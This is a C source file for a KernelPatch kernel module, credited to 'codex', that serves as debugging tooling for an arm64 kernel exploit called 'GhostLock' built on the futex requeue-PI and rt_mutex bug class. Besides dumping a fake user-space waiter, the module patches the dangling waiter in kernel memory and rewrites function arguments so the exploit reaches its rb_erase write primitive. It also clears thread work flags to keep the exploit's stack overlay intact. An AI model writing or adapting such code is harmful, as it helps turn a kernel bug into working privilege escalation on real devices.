/* SPDX-License-Identifier: GPL-2.0-or-later
 *
 * rtmutex-dbg: GhostLock/GOT-W29 debugging KPM.
 *
 * Hooks the rt-mutex PI adjust path and dumps the fake rt_mutex_waiter
 * (which lives in user space) to dmesg right before the kernel would
 * dereference it.  Uses probe_kernel_read (exception-table protected) so a
 * corrupt / unmapped waiter never oopses the kernel from our callback.
 *
 * Watched functions (kernel 4.19):
 *   rt_mutex_adjust_pi(task, waiter, pi_task)          -> waiter == arg1
 *   rt_mutex_adjust_prio_chain(task, chwalk, orig_task,
 *                              next_lock, orig_waiter, top_task)
 *                                                      -> orig_waiter == arg4
 *   __arm64_sys_sched_setattr(regs)                    -> trigger marker
 *
 * Waiter layout (GOT-W29 HW_FUTEX_PI, from target/got_w29_target.h):
 *   +0x00 tree, +0x18 pi_tree, +0x30 task, +0x38 lock,
 *   +0x40 major, +0x48 prio, +0x50 deadline
 */

#include <log.h>
#include <compiler.h>
#include <kpmodule.h>
#include <hook.h>
#include <ksyms.h>
#include <kputils.h>
#include <uapi/asm-generic/errno-base.h>
#include <asm/current.h>
#include <asm/thread_info.h>
#include <linux/kernel.h>

KPM_NAME("rtmutex-dbg");
KPM_VERSION("1.0.0");
KPM_LICENSE("GPL v2");
KPM_AUTHOR("codex");
KPM_DESCRIPTION("rt_mutex fake waiter dumper for GhostLock debugging");

#define RTMDBG_TAG "[RTMDBG] "
#define W_DUMP_SZ 0x80

/* call counters (ctl0 reads them) */
static unsigned long g_adjust_pi_calls;
static unsigned long g_adjust_pi_nonnull;
static unsigned long g_adjust_prio_chain_calls;
static unsigned long g_pselect6_calls;

/* resolved kfuncs */
long kfunc_def(probe_kernel_read)(void *dst, const void *src, unsigned long size);
long kfunc_def(probe_kernel_write)(void *dst, const void *src, unsigned long size);
unsigned long kfunc_def(__arch_copy_from_user)(void *to, const void __user *from,
                                               unsigned long n);
void *kvar_def(init_task);
void *kvar_def(empty_zero_page);
void *kvar_def(loggers);
void *kvar_def(sysctl_bootid);
int kfunc_def(rt_mutex_adjust_pi)(void *task, void *waiter, void *pi_task);
int kfunc_def(rt_mutex_adjust_prio_chain)(void *task, int chwalk, void *orig_task,
                                          void *next_lock, void *orig_waiter,
                                          void *top_task);
long kfunc_def(__arm64_sys_sched_setattr)(const void *regs);
long kfunc_def(__arm64_sys_pselect6)(const void *regs);
long kfunc_def(__arm64_sys_futex)(const void *regs);

#define FUTEX_CMP_REQUEUE_PI 13
#define FUTEX_WAIT_REQUEUE_PI 14

static void dump_waiter(uint64_t waiter)
{
    unsigned char buf[W_DUMP_SZ];
    long ret;
    int i;

    if (!kf_probe_kernel_read) {
        logkw(RTMDBG_TAG "probe_kernel_read missing, skip dump\n");
        return;
    }

    ret = kf_probe_kernel_read(buf, (const void *)waiter, sizeof(buf));
    if (ret < 0) {
        logke(RTMDBG_TAG "probe_kernel_read(waiter=0x%llx) failed: %ld\n",
              waiter, ret);
        return;
    }

    logki(RTMDBG_TAG "waiter 0x%llx:\n", waiter);
    for (i = 0; i < W_DUMP_SZ; i += 16) {
        int j;
        logki(RTMDBG_TAG "  %04x: %02x %02x %02x %02x  %02x %02x %02x %02x  "
              "%02x %02x %02x %02x  %02x %02x %02x %02x\n",
              i,
              buf[i + 0], buf[i + 1], buf[i + 2], buf[i + 3],
              buf[i + 4], buf[i + 5], buf[i + 6], buf[i + 7],
              buf[i + 8], buf[i + 9], buf[i + 10], buf[i + 11],
              buf[i + 12], buf[i + 13], buf[i + 14], buf[i + 15]);
    }

    /* summarize the fields we care about (GOT-W29 HW_FUTEX_PI layout) */
    {
        uint64_t task = *(uint64_t *)(buf + 0x30);
        uint64_t lock = *(uint64_t *)(buf + 0x38);
        uint64_t deadline = *(uint64_t *)(buf + 0x50);
        logki(RTMDBG_TAG "  task=0x%llx lock=0x%llx deadline=0x%llx\n",
              task, lock, deadline);
        if ((lock >> 48) == 0 && lock < 0x100000000000ULL)
            logkw(RTMDBG_TAG "  !! lock looks like a USER address (0x%llx) "
                  "-> waiter overlay is BROKEN\n", lock);
        else if (lock >> 56 == 0xffffffUL >> 8)
            logki(RTMDBG_TAG "  lock is a kernel address - overlay intact\n");
    }
}

static void before_adjust_pi(hook_fargs3_t *args, void *udata)
{
    g_adjust_pi_calls++;
    /* throttled unconditional trace: proves the hook fires even when the
     * full dump below is skipped (waiter==NULL) or printk races a panic */
    if ((g_adjust_pi_calls & 0x3F) == 1) {
        logki(RTMDBG_TAG "adjust_pi[%lu] task=0x%llx waiter=0x%llx "
              "pi_task=0x%llx\n",
              g_adjust_pi_calls, args->arg0, args->arg1, args->arg2);
    }
    if (args->arg1 != 0)
        g_adjust_pi_nonnull++;

    /* Normal system PI adjustments pass waiter==NULL; only the exploit's
     * fake-waiter path has a non-NULL (user-space) waiter.  Keep quiet
     * otherwise so we do not flood dmesg. */
    if (args->arg1 == 0)
        return;

    logki(RTMDBG_TAG "rt_mutex_adjust_pi task=0x%llx waiter=0x%llx "
          "pi_task=0x%llx\n",
          args->arg0, args->arg1, args->arg2);
    dump_waiter(args->arg1);
}

static void before_adjust_prio_chain(hook_fargs6_t *args, void *udata)
{
    g_adjust_prio_chain_calls++;

    /* GhostLock overlay REPAIR (fake walk): orig_waiter is NULL, the dangling
     * waiter comes from task->pi_blocked_on and its task/lock/tree words were
     * clobbered by the pselect return path.  Reconstruct them so
     * rt_mutex_adjust_prio_chain passes [3] (next_lock == waiter->lock) and
     * reaches [7] rt_mutex_dequeue() (the rb_erase write primitive).  Only
     * touch waiters whose task field is NULL - real kernel waiters always
     * have a valid task, so system PI walks are never modified. */
    if (kf_probe_kernel_write && kf_probe_kernel_read &&
        kv_init_task && kv_loggers && kv_sysctl_bootid && args->arg4 == 0 &&
        args->arg0 && args->arg3) {
        uint64_t waiter = 0;
        kf_probe_kernel_read(&waiter, (void *)(args->arg0 + 0xa90), 8);
        if (waiter) {
            uint64_t task_field = 0;
            kf_probe_kernel_read(&task_field, (void *)(waiter + 0x30), 8);
            if (task_field == 0) {
                uint64_t tp = (uint64_t)kv_loggers + 8;    /* &loggers[0][1] */
                uint64_t zero = 0;
                uint64_t tl = (uint64_t)kv_sysctl_bootid;  /* boot_id data */
                uint64_t tv = (uint64_t)kv_init_task;
                uint64_t lv = (uint64_t)kv_empty_zero_page; /* writable zero
                                                              ownerless lock */
                args->arg3 = lv;   /* rewrite next_lock too: _transit8 calls
                                      origin with the patched fargs, so [3]
                                      (next_lock == waiter->lock) passes */
                kf_probe_kernel_write((void *)(waiter + 0x00), &tp, 8);
                kf_probe_kernel_write((void *)(waiter + 0x08), &zero, 8);
                kf_probe_kernel_write((void *)(waiter + 0x10), &tl, 8);
                kf_probe_kernel_write((void *)(waiter + 0x30), &tv, 8);
                kf_probe_kernel_write((void *)(waiter + 0x38), &lv, 8);
                logki(RTMDBG_TAG "REPAIR3 waiter=0x%llx tree_pc=0x%llx "
                      "tree_left=0x%llx task=0x%llx lock=0x%llx\n",
                      waiter, tp, tl, tv, lv);
            }
        }
    }

    if ((g_adjust_prio_chain_calls & 0xF) == 1) {
        logki(RTMDBG_TAG "prio_chain[%lu] task=0x%llx chwalk=%d "
              "orig_lock=0x%llx next_lock=0x%llx orig_waiter=0x%llx "
              "top=0x%llx\n",
              g_adjust_prio_chain_calls, args->arg0, (int)args->arg1,
              args->arg2, args->arg3, args->arg4, args->arg5);
    }
    if (args->arg4 == 0) {
        /* The exploit's fake walk passes orig_waiter==NULL; the dangling
         * waiter is reached inside the function via task->pi_blocked_on
         * (GOT-W29 offset 0xa90).  Read it safely and dump it too. */
        uint64_t waiter = 0;
        if (kf_probe_kernel_read && args->arg0) {
            kf_probe_kernel_read(&waiter,
                                 (void *)(args->arg0 + 0xa90), 8);
        }
        logki(RTMDBG_TAG "prio_chain[%lu] waiter=NULL task=0x%llx "
              "pi_blocked_on=0x%llx orig_lock=0x%llx next_lock=0x%llx "
              "top=0x%llx\n",
              g_adjust_prio_chain_calls, args->arg0, waiter, args->arg2,
              args->arg3, args->arg5);
        if (waiter)
            dump_waiter(waiter);
        return;
    }

    logki(RTMDBG_TAG "rt_mutex_adjust_prio_chain task=0x%llx chwalk=%d "
          "orig_task=0x%llx next_lock=0x%llx orig_waiter=0x%llx top=0x%llx\n",
          args->arg0, (int)args->arg1, args->arg2, args->arg3,
          args->arg4, args->arg5);
    dump_waiter(args->arg4);
}

static void after_adjust_prio_chain(hook_fargs6_t *args, void *udata)
{
    logki(RTMDBG_TAG "prio_chain_ret=%ld\n", (long)args->ret);
}

/* The GhostLock overlay lives in the waiter's kernel stack at the depth of
 * the futex WAIT_REQUEUE_PI rt_waiter.  After pselect returns, the syscall
 * exit path runs do_notify_resume() -> schedule() whenever TIF_NEED_RESCHED
 * is set (this busy tablet sets it constantly); even though the waiter runs
 * at SCHED_FIFO 99 and is never preempted, the schedule() CALL ITSELF writes
 * its frame (saved LR do_notify_resume+0x88) onto the overlay's task/lock
 * words and the consumer's walk faults (observed deterministically as
 * 0x10000008).  Clear TIF_NEED_RESCHED after pselect6 returns so the exit
 * path skips schedule() entirely.  Only affects the pselect caller. */
static void clear_need_resched(void)
{
    struct thread_info *ti = current_thread_info();
    ti->flags &= ~_TIF_NEED_RESCHED;
}

/* Before-hook: clear TIF_NEED_RESCHED before do_select/do_poll runs so the
 * cond_resched() at the top of the poll loop cannot call schedule() (whose
 * frame lands on the dangling waiter words).  After-hook: same for the
 * syscall return path. */
static void before_pselect6(hook_fargs1_t *args, void *udata)
{
    clear_need_resched();
    /* Dump the userspace fd_sets BEFORE the syscall: poc only prints in3/in4,
     * but a stray low word (in[0..2]) would make max_select_fd stop below 192
     * and res_in[3]/[4] would never be computed -> overlay task/lock = 0. */
    if (args->arg0) {
        const unsigned long *r = (const unsigned long *)args->arg0;
        uint64_t nfds = r[0];
        if (nfds >= 128 && kf___arch_copy_from_user) {
            uint64_t in = r[1], ex = r[3];
            unsigned long wi[5] = {0, 0, 0, 0, 0};
            unsigned long wx[5] = {0, 0, 0, 0, 0};
            kf___arch_copy_from_user(wi, (const void __user *)in, 40);
            kf___arch_copy_from_user(wx, (const void __user *)ex, 40);
            logki(RTMDBG_TAG "pselect6 BEFORE nfds=%llu in=[%lx %lx %lx %lx %lx] "
                  "ex=[%lx %lx %lx %lx %lx]\n",
                  (unsigned long long)nfds, wi[0], wi[1], wi[2], wi[3], wi[4],
                  wx[0], wx[1], wx[2], wx[3], wx[4]);
        }
    }
}

static void after_pselect6(hook_fargs1_t *args, void *udata)
{
    g_pselect6_calls++;
    /* NOTE: keep this callback minimal!  Any local state/logging here runs on
     * the waiter's kernel stack at a depth that can collide with the overlay
     * bytes at 0x1b0 and corrupt the fake waiter words before the consumer
     * walks them.  Clear ALL of _TIF_WORK_MASK: do_notify_resume() is invoked
     * on the syscall return path whenever ANY work flag is set (SIGPENDING,
     * NOTIFY_RESUME, FOREIGN_FPSTATE, ...), and its frame (LR
     * do_notify_resume+0x88) lands exactly on the overlay bytes.  RT prio and
     * clearing just NEED_RESCHED do not stop it.  The waiter blocks all
     * signals and busy-spins with zero syscalls, so dropping these flags is
     * harmless here. */
    struct thread_info *ti = current_thread_info();
    uint64_t nfds = args->arg0 ? ((const unsigned long *)args->arg0)[0] : 0;
    if (nfds == 320) {
        /* GhostLock's waiter only; dropping ALL work flags here is what keeps
         * do_notify_resume() off the return path so its frame cannot clobber
         * the overlay.  System pselect callers must keep their flags. */
        ti->flags &= ~_TIF_WORK_MASK;
    } else {
        ti->flags &= ~_TIF_NEED_RESCHED;
    }
}

/* bionic's pselect() may be implemented via ppoll; hook it too so the
 * TIF_NEED_RESCHED clear actually runs on the waiter's syscall return. */
long kfunc_def(__arm64_sys_ppoll)(const void *regs);
int kfunc_def(do_select)(int n, void *fds, void *end_time);
static unsigned long g_ppoll_calls;

static void before_ppoll(hook_fargs1_t *args, void *udata)
{
    clear_need_resched();
}

static void after_ppoll(hook_fargs1_t *args, void *udata)
{
    g_ppoll_calls++;
    if (g_ppoll_calls <= 3) {
        struct thread_info *ti = current_thread_info();
        logki(RTMDBG_TAG "ppoll after ti=0x%llx flags=0x%lx "
              "NEED_RESCHED=%d\n",
              (unsigned long long)(uintptr_t)ti, ti->flags,
              !!(ti->flags & _TIF_NEED_RESCHED));
    }
    clear_need_resched();
}

/* Trace the waiter's requeue-PI futex calls: confirm WAIT_REQUEUE_PI runs,
 * what timeout it got, and whether/why it returns. */
static unsigned long g_futex_requeue_calls;

static void before_futex(hook_fargs1_t *args, void *udata)
{
    if (!args->arg0)
        return;
    const unsigned long *r = (const unsigned long *)args->arg0;
    long op = (long)r[1];
    if (op == FUTEX_WAIT_REQUEUE_PI || op == FUTEX_CMP_REQUEUE_PI) {
        g_futex_requeue_calls++;
        logki(RTMDBG_TAG "futex[%lu] op=%ld uaddr=%lx val=%lx "
              "timeout=%lx uaddr2=%lx\n",
              g_futex_requeue_calls, op, r[0], r[2], r[3], r[4]);
    }
}

static void after_futex(hook_fargs1_t *args, void *udata)
{
    if (!args->arg0)
        return;
    const unsigned long *r = (const unsigned long *)args->arg0;
    long op = (long)r[1];
    if (op == FUTEX_WAIT_REQUEUE_PI || op == FUTEX_CMP_REQUEUE_PI) {
        logki(RTMDBG_TAG "futex op=%ld ret=%ld\n", op, (long)args->ret);
    }
}

/* Read res_in[3]/[4] straight from the kernel-side fd_set_bits after
 * do_select: no userspace copy, no PAN, no set_fd_set involvement. */
static void after_do_select(hook_fargs3_t *args, void *udata)
{
    if (!args->arg1 || (int)args->arg0 < 128)
        return;
    int n = (int)args->arg0;
    unsigned long r3 = 0, r4 = 0;
    uint64_t res_in = 0;
    if (kf_probe_kernel_read) {
        /* fd_set_bits is {in,out,ex,res_in,res_out,res_ex} pointers;
         * res_in pointer lives at offset 24, then words at +24/+32. */
        kf_probe_kernel_read(&res_in, (void *)((uint64_t)args->arg1 + 24), 8);
        if (res_in) {
            kf_probe_kernel_read(&r3, (void *)(res_in + 24), 8);
            kf_probe_kernel_read(&r4, (void *)(res_in + 32), 8);
        }
    }
    logki(RTMDBG_TAG "do_select n=%d ret=%ld res_in_ptr=0x%llx "
          "res_in[3]=0x%lx res_in[4]=0x%lx\n",
          n, (long)args->ret, (unsigned long long)res_in, r3, r4);
}

static long rtmutex_dbg_init(const char *args, const char *event,
                             void *__user reserved)
{
    hook_err_t err;

    kfunc_lookup_name(probe_kernel_read);
    kfunc_lookup_name(probe_kernel_write);
    kvar_lookup_name(init_task);
    kvar_lookup_name(empty_zero_page);
    kvar_lookup_name(loggers);
    kvar_lookup_name(sysctl_bootid);
    if (!kf_probe_kernel_read) {
        logke(RTMDBG_TAG "probe_kernel_read not found, dumps disabled\n");
    }

    kfunc_lookup_name(rt_mutex_adjust_pi);
    kfunc_lookup_name(rt_mutex_adjust_prio_chain);
    kfunc_lookup_name(__arm64_sys_pselect6);
    kfunc_lookup_name(__arm64_sys_ppoll);
    kfunc_lookup_name(__arm64_sys_futex);
    kfunc_lookup_name(do_select);

    logki(RTMDBG_TAG "symbols: adjust_pi=%s adjust_prio_chain=%s "
          "pselect6=%s ppoll=%s futex=%s\n",
          kf_rt_mutex_adjust_pi ? "ok" : "MISS",
          kf_rt_mutex_adjust_prio_chain ? "ok" : "MISS",
          kf___arm64_sys_pselect6 ? "ok" : "MISS",
          kf___arm64_sys_ppoll ? "ok" : "MISS",
          kf___arm64_sys_futex ? "ok" : "MISS");
    logki(RTMDBG_TAG "vars: init_task=%s empty_zero_page=%s "
          "loggers=%s sysctl_bootid=%s probe_write=%s\n",
          kv_init_task ? "ok" : "MISS",
          kv_empty_zero_page ? "ok" : "MISS",
          kv_loggers ? "ok" : "MISS",
          kv_sysctl_bootid ? "ok" : "MISS",
          kf_probe_kernel_write ? "ok" : "MISS");

    if (kf_rt_mutex_adjust_pi) {
        err = hook_wrap3((void *)kf_rt_mutex_adjust_pi,
                         before_adjust_pi, 0, 0);
        logki(RTMDBG_TAG "hook rt_mutex_adjust_pi: %d\n", err);
    }
    if (kf_rt_mutex_adjust_prio_chain) {
        err = hook_wrap6((void *)kf_rt_mutex_adjust_prio_chain,
                         before_adjust_prio_chain, after_adjust_prio_chain, 0);
        logki(RTMDBG_TAG "hook rt_mutex_adjust_prio_chain: %d\n", err);
    }
    if (kf___arm64_sys_pselect6) {
        err = hook_wrap1((void *)kf___arm64_sys_pselect6,
                         before_pselect6, after_pselect6, 0);
        logki(RTMDBG_TAG "hook __arm64_sys_pselect6 (TIF clear): %d\n", err);
    }
    if (kf___arm64_sys_ppoll) {
        err = hook_wrap1((void *)kf___arm64_sys_ppoll,
                         before_ppoll, after_ppoll, 0);
        logki(RTMDBG_TAG "hook __arm64_sys_ppoll (TIF clear): %d\n", err);
    }
    if (kf___arm64_sys_futex) {
        err = hook_wrap1((void *)kf___arm64_sys_futex,
                         before_futex, after_futex, 0);
        logki(RTMDBG_TAG "hook __arm64_sys_futex: %d\n", err);
    }
    if (kf_do_select) {
        err = hook_wrap3((void *)kf_do_select, 0, after_do_select, 0);
        logki(RTMDBG_TAG "hook do_select: %d\n", err);
    }
    logki(RTMDBG_TAG "rtmutex-dbg loaded (init always succeeds)\n");
    return 0;
}

static long rtmutex_dbg_control0(const char *args, char *__user out_msg,
                                 int outlen)
{
    if (out_msg && outlen > 0) {
        char buf[256];
        int n = snprintf(buf, sizeof(buf),
                         "adjust_pi=%lu nonnull=%lu prio_chain=%lu pselect6=%lu",
                         g_adjust_pi_calls, g_adjust_pi_nonnull,
                         g_adjust_prio_chain_calls, g_pselect6_calls);
        if (n > outlen)
            n = outlen;
        if (compat_copy_to_user(out_msg, buf, n) == 0)
            return n;
    }
    return -EINVAL;
}

static long rtmutex_dbg_exit(void *__user reserved)
{
    if (kf_rt_mutex_adjust_pi)
        unhook((void *)kf_rt_mutex_adjust_pi);
    if (kf_rt_mutex_adjust_prio_chain)
        unhook((void *)kf_rt_mutex_adjust_prio_chain);
    if (kf___arm64_sys_pselect6)
        unhook((void *)kf___arm64_sys_pselect6);
    if (kf___arm64_sys_ppoll)
        unhook((void *)kf___arm64_sys_ppoll);
    if (kf___arm64_sys_futex)
        unhook((void *)kf___arm64_sys_futex);
    if (kf_do_select)
        unhook((void *)kf_do_select);
    logki(RTMDBG_TAG "rtmutex-dbg unloaded\n");
    return 0;
}

KPM_INIT(rtmutex_dbg_init);
KPM_CTL0(rtmutex_dbg_control0);
KPM_EXIT(rtmutex_dbg_exit);
